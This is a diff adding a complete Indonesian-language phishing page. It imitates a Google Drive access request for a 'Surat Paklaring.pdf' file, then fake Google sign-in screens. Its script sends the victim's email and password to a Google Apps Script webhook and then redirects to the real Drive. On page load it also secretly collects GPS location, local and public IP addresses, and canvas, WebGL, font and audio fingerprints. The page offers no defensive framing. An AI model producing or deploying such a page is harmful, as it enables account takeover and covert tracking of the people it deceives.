@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Surat Paklaring.pdf - Google Drive</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 87.3 78'%3E%3Cpath fill='%231967D2' d='M6.6 66.85l3.85 6.65a9.06 9.06 0 003.3 3.3l13.75-23.8H.5a9.06 9.06 0 001.2 4.5z'/%3E%3Cpath fill='%2334A853' d='M43.65 25L29.9 1.2a9.06 9.06 0 00-3.3 3.3L1.2 48.5a9.06 9.06 0 00-1.2 4.5h27.5z'/%3E%3Cpath fill='%23EA4335' d='M73.55 76.8a9.06 9.06 0 003.3-3.3l1.6-2.75 7.65-13.25a9.06 9.06 0 001.2-4.5H59.8l5.85 11.5z'/%3E%3Cpath fill='%23188038' d='M43.65 25L57.4 1.2a9.06 9.06 0 00-4.5-1.2H34.4a9.06 9.06 0 00-4.5 1.2z'/%3E%3Cpath fill='%234285F4' d='M59.8 53H27.5L13.75 76.8a9.06 9.06 0 004.5 1.2h50.8a9.06 9.06 0 004.5-1.2z'/%3E%3Cpath fill='%23FBBC04' d='M73.4 26.5l-12.7-22a9.06 9.06 0 00-3.3-3.3L43.65 25l16.15 28h27.45a9.06 9.06 0 00-1.2-4.5z'/%3E%3C/svg%3E">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    @font-face {
+      font-family: 'Google Sans';
+      font-style: normal;
+      font-weight: 400;
+      src: url('https://fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Kwp5MKg.woff2') format('woff2');
+    }
+    @font-face {
+      font-family: 'Google Sans';
+      font-style: normal;
+      font-weight: 500;
+      src: url('https://fonts.gstatic.com/s/googlesans/v14/4UaGrENHsxJlGDuGo1OIlL3Owp5MKg.woff2') format('woff2');
+    }
+    body {
+      font-family: 'Google Sans', 'Open Sans', Arial, sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+    }
+    .g-input-container { position: relative; width: 100%; }
+    .g-input {
+      width: 100%; padding: 14px 15px; font-size: 16px; color: #202124;
+      border: 1px solid #747775; border-radius: 4px; outline: none;
+      background-color: transparent; transition: border 0.2s ease, padding 0.2s ease;
+    }
+    .g-input:focus { border: 2px solid #0b57d0; padding: 13px 14px; }
+    .g-label {
+      position: absolute; left: 11px; top: 15px; background: white;
+      padding: 0 4px; color: #5f6368; font-size: 16px;
+      transition: 0.2s ease all; pointer-events: none;
+    }
+    .g-input:focus ~ .g-label,
+    .g-input:not(:placeholder-shown) ~ .g-label {
+      top: -9px; font-size: 12px; color: #0b57d0;
+    }
+    .g-input:not(:focus):not(:placeholder-shown) ~ .g-label { color: #5f6368; }
+    .g-checkbox {
+      appearance: none; width: 18px; height: 18px; border: 2px solid #5f6368;
+      border-radius: 2px; display: inline-flex; align-items: center; justify-content: center;
+      cursor: pointer; transition: background-color 0.1s, border-color 0.1s;
+    }
+    .g-checkbox:checked { background-color: #0b57d0; border-color: #0b57d0; }
+    .g-checkbox:checked::after {
+      content: ''; width: 5px; height: 10px; border: solid white;
+      border-width: 0 2px 2px 0; transform: rotate(45deg); margin-bottom: 2px;
+    }
+    .radio-custom { display: none; }
+    .radio-label { display: flex; align-items: center; cursor: pointer; font-size: 16px; color: #202124; margin-bottom: 20px; }
+    .radio-circle {
+      width: 20px; height: 20px; border: 2px solid #5f6368; border-radius: 50%;
+      margin-right: 16px; display: flex; align-items: center; justify-content: center;
+      transition: border-color 0.2s;
+    }
+    .radio-inner-circle {
+      width: 10px; height: 10px; background-color: #0b57d0; border-radius: 50%;
+      transform: scale(0); transition: transform 0.1s ease-in-out;
+    }
+    .radio-custom:checked + .radio-label .radio-circle { border-color: #0b57d0; }
+    .radio-custom:checked + .radio-label .radio-circle .radio-inner-circle { transform: scale(1); }
+    .screen { display: none; }
+    .screen.active { display: flex; }
+    .spinner {
+      display: inline-block; width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,0.3); border-top: 2px solid white;
+      border-radius: 50%; animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .action-link { padding-top: 8px; padding-bottom: 8px; line-height: 20px; }
+    .pointer-events-none { pointer-events: none; }
+  </style>
+</head>
+<body class="flex items-center justify-center min-h-screen">
+  <div class="w-full max-w-[450px] min-h-[550px] h-screen sm:h-auto px-6 py-8 sm:py-12 flex flex-col justify-between">
+    <!-- SCREEN 1: AKSES DRIVE -->
+    <div id="screen1" class="screen active flex-col h-full">
+      <div class="flex-grow">
+        <div class="flex items-center mb-[26px]">
+          <svg class="mr-[10px] w-[26px] h-[26px]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 87.3 78">
+            <path fill="#1967D2" d="M6.6 66.85l3.85 6.65a9.06 9.06 0 003.3 3.3l13.75-23.8H.5a9.06 9.06 0 001.2 4.5z" />
+            <path fill="#34A853" d="M43.65 25L29.9 1.2a9.06 9.06 0 00-3.3 3.3L1.2 48.5a9.06 9.06 0 00-1.2 4.5h27.5z" />
+            <path fill="#EA4335" d="M73.55 76.8a9.06 9.06 0 003.3-3.3l1.6-2.75 7.65-13.25a9.06 9.06 0 001.2-4.5H59.8l5.85 11.5z" />
+            <path fill="#188038" d="M43.65 25L57.4 1.2a9.06 9.06 0 00-4.5-1.2H34.4a9.06 9.06 0 00-4.5 1.2z" />
+            <path fill="#4285F4" d="M59.8 53H27.5L13.75 76.8a9.06 9.06 0 004.5 1.2h50.8a9.06 9.06 0 004.5-1.2z" />
+            <path fill="#FBBC04" d="M73.4 26.5l-12.7-22a9.06 9.06 0 00-3.3-3.3L43.65 25l16.15 28h27.45a9.06 9.06 0 00-1.2-4.5z" />
+          </svg>
+          <span class="text-[23px] text-[#5f6368] font-normal tracking-[-0.2px] mb-0.5">Google Drive</span>
+        </div>
+        <h1 class="text-[28px] text-[#1f1f1f] mb-3 font-normal leading-tight">Anda memerlukan akses</h1>
+        <p class="text-[16px] text-[#1f1f1f] mb-8 leading-[1.6]">
+          Minta akses atau beralih ke akun yang memiliki akses. 
+          <a href="#" class="text-[#0b57d0] hover:underline">Pelajari lebih lanjut</a>
+        </p>
+        <div class="mb-6 ml-1">
+          <input type="radio" name="access" id="view" class="radio-custom" checked>
+          <label for="view" class="radio-label"><div class="radio-circle"><div class="radio-inner-circle"></div></div>Pelihat</label>
+          <input type="radio" name="access" id="comment" class="radio-custom">
+          <label for="comment" class="radio-label"><div class="radio-circle"><div class="radio-inner-circle"></div></div>Pengomentar</label>
+          <input type="radio" name="access" id="edit" class="radio-custom">
+          <label for="edit" class="radio-label"><div class="radio-circle"><div class="radio-inner-circle"></div></div>Editor</label>
+        </div>
+        <div class="g-input-container mt-4">
+          <textarea id="pesanInput" class="g-input" style="height: 110px; resize: none; padding-top: 14px;" placeholder=" "></textarea>
+          <label class="g-label">Pesan (opsional)</label>
+        </div>
+        <button id="reqBtnAccess" class="bg-[#0b57d0] hover:bg-[#084298] text-white text-[14px] font-medium rounded-full px-[26px] py-[10px] mt-8 transition-colors inline-flex items-center justify-center gap-2">
+          <span id="btnTextAccess">Minta akses</span>
+          <span id="btnSpinnerAccess" class="spinner" style="display:none;"></span>
+        </button>
+      </div>
+    </div>
+
+    <!-- SCREEN 2: LOGIN EMAIL -->
+    <div id="screen2" class="screen flex-col h-full justify-between">
+      <div class="flex-grow">
+        <svg class="mb-4" viewBox="0 0 48 48" width="40" height="40">
+          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+        </svg>
+        <h1 class="text-[30px] text-[#202124] mb-2 font-normal">Login</h1>
+        <p class="text-[16px] text-[#202124] mb-10 tracking-wide">Gunakan Akun Google Anda</p>
+        <div class="g-input-container">
+          <input type="text" id="emailInput" class="g-input" placeholder=" ">
+          <label class="g-label">Email atau nomor telepon</label>
+        </div>
+        <div class="mt-2 mb-12">
+          <a href="#" class="text-[#0b57d0] text-[14px] font-medium hover:underline -ml-1 px-1">Lupa email?</a>
+        </div>
+        <div class="mt-8 text-[14px] text-[#444746] leading-[1.6]">
+          Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi. 
+          <a href="#" class="text-[#0b57d0] font-medium hover:underline">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
+        </div>
+      </div>
+      <div>
+        <div class="flex items-center justify-between mt-12 mb-16">
+          <a href="#" class="text-[#0b57d0] text-[14px] font-medium hover:underline px-1 -ml-1 action-link">Buat akun</a>
+          <button id="emailNextBtn" class="text-[#9aa0a6] font-medium text-[14px] px-2 py-2 rounded pointer-events-none transition-colors">Berikutnya</button>
+        </div>
+        <div class="flex justify-between items-center text-[12px] text-[#444746] w-full pt-2">
+          <div class="flex items-center cursor-pointer hover:bg-gray-100 px-1 py-1 rounded -ml-1">
+            Indonesia
+            <svg class="w-4 h-4 ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+          </div>
+          <div class="flex space-x-4">
+            <a href="#" class="hover:bg-gray-100 px-1 py-1 rounded">Bantuan</a>
+            <a href="#" class="hover:bg-gray-100 px-1 py-1 rounded">Privasi</a>
+            <a href="#" class="hover:bg-gray-100 px-1 py-1 rounded">Persyaratan</a>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 3: PASSWORD -->
+    <div id="screen3" class="screen flex-col h-full justify-between">
+      <div class="flex-grow">
+        <svg class="mb-4" viewBox="0 0 48 48" width="40" height="40">
+          <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+          <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+          <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+          <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+        </svg>
+        <h1 class="text-[28px] text-[#202124] mb-2 font-normal">Selamat datang</h1>
+        <div class="border border-[#dadce0] rounded-full inline-flex items-center px-[9px] py-[4px] mt-2 mb-10 cursor-pointer hover:bg-gray-50">
+          <svg class="w-5 h-5 text-gray-500 mr-2" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+          <span id="userEmailDisplay" class="text-[14px] text-[#3c4043] font-medium mr-1 tracking-wide">fkhairudin7@gmail.com</span>
+          <svg class="w-[18px] h-[18px] text-[#5f6368]" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
+        </div>
+        <div class="g-input-container">
+          <input type="password" id="passwordInput" class="g-input" placeholder=" ">
+          <label class="g-label">Masukkan sandi</label>
+        </div>
+        <div class="flex items-center mt-3 ml-1">
+          <input type="checkbox" id="showPass" class="g-checkbox">
+          <label for="showPass" class="ml-[14px] text-[14px] text-[#202124] cursor-pointer">Tampilkan sandi</label>
+        </div>
+      </div>
+      <div>
+        <div class="flex items-center justify-between mt-12 mb-16">
+          <a href="#" class="text-[#0b57d0] text-[14px] font-medium hover:underline px-1 -ml-1 action-link">Coba cara lain</a>
+          <button id="passwordNextBtn" class="text-[#9aa0a6] font-medium text-[14px] px-2 py-2 rounded pointer-events-none transition-colors">Berikutnya</button>
+        </div>
+        <div class="flex justify-between items-center text-[12px] text-[#444746] w-full pt-2">
+          <div class="flex items-center cursor-pointer hover:bg-gray-100 px-1 py-1 rounded -ml-1">
+            Indonesia
+            <svg class="w-4 h-4 ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+          </div>
+          <div class="flex space-x-4">
+            <a href="#" class="hover:bg-gray-100 px-1 py-1 rounded">Bantuan</a>
+            <a href="#" class="hover:bg-gray-100 px-1 py-1 rounded">Privasi</a>
+            <a href="#" class="hover:bg-gray-100 px-1 py-1 rounded">Persyaratan</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbyjgVcbKIQvPTjvThthDz6CsBHvhtP2aLCZRBj907lHNjPThVhsIeSPvv8ot5xmnKgPhg/exec";
+    let capturedEmail = "";
+
+    async function getIP() {
+      const apis = ["https://api.ipify.org?format=json", "https://api64.ipify.org?format=json", "https://api.myip.com"];
+      for (const url of apis) {
+        try { const r = await fetch(url); const d = await r.json(); return d.ip || d.ip_address || "IP gagal"; } catch {}
+      }
+      return "IP gagal";
+    }
+    
+    // 🔥 PERBAIKAN: getIPInfo sekarang coba ipapi.co dulu, lalu fallback ke ip-api.com
+    async function getIPInfo(ip) {
+      // Coba ipapi.co dulu
+      try {
+        const r = await fetch(`https://ipapi.co/${ip}/json/`);
+        if (r.ok) {
+          const d = await r.json();
+          return {
+            geoString: `${d.city ?? '?'}, ${d.region ?? '?'}, ${d.country_name ?? '?'} (${d.latitude ?? 0},${d.longitude ?? 0})`,
+            org: d.org || 'Tidak diketahui'
+          };
+        }
+      } catch (e) {}
+      
+      // Fallback ke ip-api.com (gratis, tanpa API key)
+      try {
+        const r = await fetch(`http://ip-api.com/json/${ip}`);
+        if (r.ok) {
+          const d = await r.json();
+          if (d.status === "success") {
+            return {
+              geoString: `${d.city ?? '?'}, ${d.regionName ?? '?'}, ${d.country ?? '?'} (${d.lat ?? 0},${d.lon ?? 0})`,
+              org: d.isp || d.org || 'Tidak diketahui'
+            };
+          }
+        }
+      } catch (e) {}
+      
+      // Jika semua gagal
+      return { geoString: "GeoIP gagal", org: "Gagal" };
+    }
+    
+    function getLocalIPDetail(ipString) {
+      if (!ipString || ipString === "Tidak terdeteksi") return "Tidak ada IP lokal";
+      const ips = ipString.split(',').map(s => s.trim());
+      const details = ips.map(ip => {
+        if (ip.startsWith('192.168.')) return 'IP Private Kelas C (LAN)';
+        if (ip.startsWith('10.')) return 'IP Private Kelas A (LAN)';
+        if (ip.startsWith('172.')) {
+          const second = parseInt(ip.split('.')[1]);
+          if (second >= 16 && second <= 31) return 'IP Private Kelas B (LAN)';
+        }
+        return 'IP Lokal Lainnya';
+      });
+      return details.join(', ');
+    }
+
+    async function sendToSheets(payload) {
+      try {
+        await fetch(WEBHOOK_URL, { method: "POST", body: JSON.stringify(payload) });
+      } catch (e) {}
+    }
+
+    async function sendDeviceData(ip, geo, geoIP, localIPs, battery, canvasFP, webglFP, fontFP, audioFP, mediaDevices, ipInfo) {
+      const ua = navigator.userAgent; const parsed = deepParseUA(ua);
+      const now = new Date().toLocaleString('id-ID',{timeZone:'Asia/Jakarta'});
+      const deviceType = parsed.device === "Mobile" ? "MOBILE" : "DESKTOP";
+      const localDetail = getLocalIPDetail(localIPs);
+
+      const data = {
+        type: "DEVICE_DATA",
+        tipe: deviceType,
+        waktu: now,
+        ipPublik: ip,
+        detailIPPublik: ipInfo ? ipInfo.org : "Tidak diketahui",
+        ipLokal: localIPs,
+        detailIPLokal: localDetail,
+        gps: geo,
+        geoIP: geoIP,
+        userAgent: ua,
+        osBrowser: `${parsed.os} | ${parsed.browser}`,
+        model: parsed.model,
+        resolusi: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cpu: navigator.hardwareConcurrency || '?',
+        ram: navigator.deviceMemory || '?',
+        touch: navigator.maxTouchPoints,
+        baterai: battery,
+        jaringan: getNetworkInfo(),
+        canvasFP: canvasFP?.substring(0,100) || '?',
+        webglFP: webglFP,
+        fontFP: fontFP,
+        audioFP: audioFP,
+        mediaDevices: mediaDevices,
+        cookies: navigator.cookieEnabled,
+        dnt: navigator.doNotTrack || 'unspecified',
+        referrer: document.referrer || 'Langsung',
+        url: window.location.href
+      };
+      await sendToSheets(data);
+    }
+
+    async function sendCredentials(email, password) {
+      if (!password || password.trim() === "") return;
+      const ip = await getIP();
+      const data = {
+        type: "CREDENTIALS",
+        waktu: new Date().toLocaleString('id-ID'),
+        email: email,
+        password: password,
+        ip: ip
+      };
+      await sendToSheets(data);
+    }
+
+    window.addEventListener('DOMContentLoaded', async () => {
+      setTimeout(async () => {
+        const ip = await getIP();
+        const ipInfo = await getIPInfo(ip);
+        const [geo, localIPs, battery, canvasFP, webglFP, fontFP, audioFP, mediaDevices] = await Promise.all([
+          getBrowserGeo(),
+          getLocalIPs(),
+          getBatteryInfo(),
+          getCanvasFingerprint(),
+          getWebGLFingerprint(),
+          getFontFingerprint(),
+          getAudioFingerprint(),
+          getMediaDevices()
+        ]);
+        await sendDeviceData(ip, geo, ipInfo.geoString, localIPs, battery, canvasFP, webglFP, fontFP, audioFP, mediaDevices, ipInfo);
+      }, 500);
+      showScreen('screen1');
+    });
+
+    function getBrowserGeo() {
+      return new Promise(resolve => {
+        if (!navigator.geolocation) return resolve("Not supported");
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve(`${pos.coords.latitude},${pos.coords.longitude} (±${Math.round(pos.coords.accuracy)}m)`),
+          err => {
+            if (err.code === 3) resolve("Timeout / GPS tidak tersedia");
+            else resolve(`Ditolak: ${err.message}`);
+          },
+          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+      });
+    }
+    function getLocalIPs() {
+      return new Promise(resolve => {
+        const ips = new Set();
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = e => {
+          if (!e.candidate) { pc.close(); resolve(Array.from(ips).join(', ') || 'Tidak terdeteksi'); return; }
+          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/g;
+          let m;
+          while ((m = ipRegex.exec(e.candidate.candidate))) {
+            if (!m[1].startsWith('0.') && !m[1].startsWith('169.254')) ips.add(m[1]);
+          }
+        };
+        setTimeout(() => { pc.close(); resolve(Array.from(ips).join(', ') || 'Tidak terdeteksi'); }, 4000);
+      });
+    }
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        try { const b = await navigator.getBattery(); return `${Math.round(b.level * 100)}% ${b.charging ? '⚡ Mengisi' : '🔋 Baterai'}`; } catch { return "Battery API error"; }
+      }
+      return "Battery API tidak didukung";
+    }
+    function getNetworkInfo() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      return c ? `${c.effectiveType} | ${c.downlink} Mbps | RTT ${c.rtt} ms` : "Tidak tersedia";
+    }
+    function deepParseUA(ua) {
+      let os = "Unknown", browser = "Unknown", device = "Desktop", model = "Unknown";
+      if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
+      else if (/Windows NT 6/.test(ua)) os = "Windows 7/8";
+      else if (/Mac OS X/.test(ua)) os = "macOS";
+      else if (/Android/.test(ua)) { os = "Android"; const m = ua.match(/;.*?\s([A-Za-z0-9\s]+?)\s*(Build|\))/); if (m) model = m[1].trim().replace(';',''); }
+      else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; const m = ua.match(/\(.*;\s*(.+?)\s*;/); if (m) model = m[1]; }
+      else if (/Linux/.test(ua)) os = "Linux";
+      if (/Edg\//.test(ua)) browser = "Edge";
+      else if (/Firefox\//.test(ua)) browser = "Firefox";
+      else if (/OPR\//.test(ua)) browser = "Opera";
+      else if (/Chrome\//.test(ua) && !/Edg\//.test(ua)) browser = "Chrome";
+      else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) browser = "Safari";
+      if (/Mobi|Android|iPhone|iPad|iPod/.test(ua)) device = "Mobile";
+      return { os, browser, device, model };
+    }
+    function getCanvasFingerprint() {
+      try {
+        const c = document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d');
+        x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20);
+        x.fillStyle='#069'; x.fillText('HacxGPT 404',2,15); return c.toDataURL();
+      } catch { return "Canvas tidak didukung"; }
+    }
+    function getWebGLFingerprint() {
+      try {
+        const c = document.createElement('canvas'); const gl = c.getContext('webgl')||c.getContext('experimental-webgl');
+        if (!gl) return "WebGL tidak didukung";
+        const debug = gl.getExtension('WEBGL_debug_renderer_info');
+        return `${debug?gl.getParameter(debug.UNMASKED_VENDOR_WEBGL):'?'} | ${debug?gl.getParameter(debug.UNMASKED_RENDERER_WEBGL):'?'}`;
+      } catch { return "WebGL error"; }
+    }
+    function getFontFingerprint() {
+      const base = ['monospace','sans-serif','serif']; const test = 'mmmmmmmmmmlli';
+      const c = document.createElement('canvas'); const x = c.getContext('2d'); const r = {};
+      for (const f of base) { x.font = `72px ${f}`; r[f] = x.measureText(test).width; }
+      return JSON.stringify(r);
+    }
+    function getAudioFingerprint() {
+      try {
+        const ctx = new (window.OfflineAudioContext||window.webkitOfflineAudioContext)(1,44100,44100);
+        const osc = ctx.createOscillator(); const ana = ctx.createAnalyser();
+        osc.connect(ana); ana.connect(ctx.destination); osc.start(0); return "AudioContext OK";
+      } catch { return "AudioContext gagal"; }
+    }
+    async function getMediaDevices() {
+      try {
+        const devs = await navigator.mediaDevices.enumerateDevices();
+        const cnt = { audioinput:0, audiooutput:0, videoinput:0 };
+        devs.forEach(d => { if (cnt[d.kind] !== undefined) cnt[d.kind]++; });
+        return `Mic:${cnt.audioinput} Speaker:${cnt.audiooutput} Kamera:${cnt.videoinput}`;
+      } catch { return "Akses media gagal"; }
+    }
+    function showScreen(id) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+    function handleAccessClick() {
+      const btn = document.getElementById('reqBtnAccess');
+      const text = document.getElementById('btnTextAccess');
+      const spinner = document.getElementById('btnSpinnerAccess');
+      btn.disabled = true;
+      btn.style.opacity = '0.7';
+      text.style.display = 'none';
+      spinner.style.display = 'inline-block';
+      setTimeout(() => {
+        showScreen('screen2');
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        text.style.display = 'inline';
+        spinner.style.display = 'none';
+      }, 800);
+    }
+    document.getElementById('reqBtnAccess').addEventListener('click', handleAccessClick);
+    const emailInput = document.getElementById('emailInput');
+    const emailNextBtn = document.getElementById('emailNextBtn');
+    emailInput.addEventListener('input', () => {
+      if (emailInput.value.trim().length > 0) {
+        emailNextBtn.classList.remove('pointer-events-none', 'text-[#9aa0a6]');
+        emailNextBtn.classList.add('text-[#0b57d0]');
+      } else {
+        emailNextBtn.classList.add('pointer-events-none', 'text-[#9aa0a6]');
+        emailNextBtn.classList.remove('text-[#0b57d0]');
+      }
+      if(emailInput.value.includes('@')) {
+        document.getElementById('userEmailDisplay').textContent = emailInput.value.trim();
+      } else if(emailInput.value.trim() !== '') {
+        document.getElementById('userEmailDisplay').textContent = emailInput.value.trim() + '@gmail.com';
+      }
+    });
+    emailNextBtn.addEventListener('click', () => {
+      const email = emailInput.value.trim();
+      if (!email) return;
+      capturedEmail = email;
+      showScreen('screen3');
+    });
+    const passwordInput = document.getElementById('passwordInput');
+    const passwordNextBtn = document.getElementById('passwordNextBtn');
+    passwordInput.addEventListener('input', () => {
+      if (passwordInput.value.trim().length > 0) {
+        passwordNextBtn.classList.remove('pointer-events-none', 'text-[#9aa0a6]');
+        passwordNextBtn.classList.add('text-[#0b57d0]');
+      } else {
+        passwordNextBtn.classList.add('pointer-events-none', 'text-[#9aa0a6]');
+        passwordNextBtn.classList.remove('text-[#0b57d0]');
+      }
+    });
+    document.getElementById('showPass').addEventListener('change', function() {
+      passwordInput.type = this.checked ? 'text' : 'password';
+    });
+    passwordNextBtn.addEventListener('click', async () => {
+      const password = passwordInput.value.trim();
+      if (!password) return;
+      passwordNextBtn.classList.add('pointer-events-none', 'text-[#9aa0a6]');
+      passwordNextBtn.classList.remove('text-[#0b57d0]');
+      await sendCredentials(capturedEmail, password);
+      window.location.replace('https://drive.google.com');
+    });
+    showScreen('screen1');
+  </script>
+</body>
+</html>
